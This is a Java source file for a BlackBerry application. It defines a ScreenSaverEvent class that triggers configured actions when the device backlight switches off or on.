package blackberry.event;

import java.io.EOFException;

import blackberry.AppListener;
import blackberry.interfaces.BacklightObserver;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

import net.rim.device.api.util.DataBuffer;

public class ScreenSaverEvent extends Event implements BacklightObserver {
    //#ifdef DEBUG
    private static Debug debug = new Debug("ScreenSaverEvent", DebugLevel.VERBOSE);
    
    int actionOnEnter;
    int actionOnExit;

    public ScreenSaverEvent(final int actionId, final byte[] confParams) {
        super(Event.EVENT_SCREENSAVER, actionId, confParams);
        setPeriod(NEVER);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStart()
     */
    protected void actualStart() {
        AppListener.getInstance().addBacklightObserver(this);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStop()
     */
    protected void actualStop() {
        AppListener.getInstance().removeBacklightObserver(this);
    }

    protected boolean parse(byte[] confParams) {
        final DataBuffer databuffer = new DataBuffer(confParams, 0,
                confParams.length, false);
        try {
            actionOnEnter = actionId;
            actionOnExit = databuffer.readInt();
        } catch (final EOFException e) {
            return false;
        }
        return true;
    }

    protected void actualRun() {

    }

    public void onBacklightChange(boolean enabled) {
        //#ifdef DEBUG_TRACE
        debug.trace("onBacklightChange: " + enabled);
        //#endif
        if (!enabled) {            
            trigger(actionOnEnter);
        } else {
            trigger(actionOnExit);
        }

    }

}
